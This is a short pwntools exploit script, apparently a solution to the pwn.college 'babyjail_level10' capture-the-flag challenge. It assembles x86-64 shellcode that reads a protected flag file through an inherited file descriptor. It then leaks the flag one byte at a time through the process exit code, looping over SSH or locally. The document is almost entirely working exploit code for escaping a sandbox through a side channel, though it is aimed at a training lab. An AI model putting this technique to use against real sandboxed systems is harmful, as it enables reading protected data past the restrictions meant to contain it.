from pwn import *
from os import system
context.arch='amd64'
shellcode="""
mov rdx, 0x64
mov rsi, 0x1337100
mov rdi, 0x3
mov rax, 0x0
syscall

xor rdi,rdi
mov edi,[rsi+{}]
mov rax,60
syscall
"""
def write_payload(offset):
        f=open("shellcode.bin","wb")
        f.write(asm(shellcode.format(offset)))
        f.close()
flag=''
if args.SSH:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key")
    for i in range(100):
        #write_payload(i)
        #s.put("shellcode.bin","/tmp/shellcode.bin")
        s.upload_data(asm(shellcode.format(i)),"/tmp/shellcode.bin")
        run_=s.run_to_end("/challenge/babyjail_level10 /flag < /tmp/shellcode.bin 1>/dev/null ; echo $?")
        ret_=int(run_[0])
        log.info("{}".format(chr(ret_)))
        if not ret_:
            break
        flag+=chr(ret_)
    print(flag)
elif args.LOCAL:
    for i in range(100):
        write_payload(i)
        ret_=system("./babyjail_level10 /flag < shellcode.bin 1>/dev/null")
        #log.info("{}".format(hex(run_)))
        #log.info("{}".format(hex(run_ // 0x100)))
        if not (ret_ // 0x100):
            break
        flag+=chr(ret_ // 0x100)
    print(flag)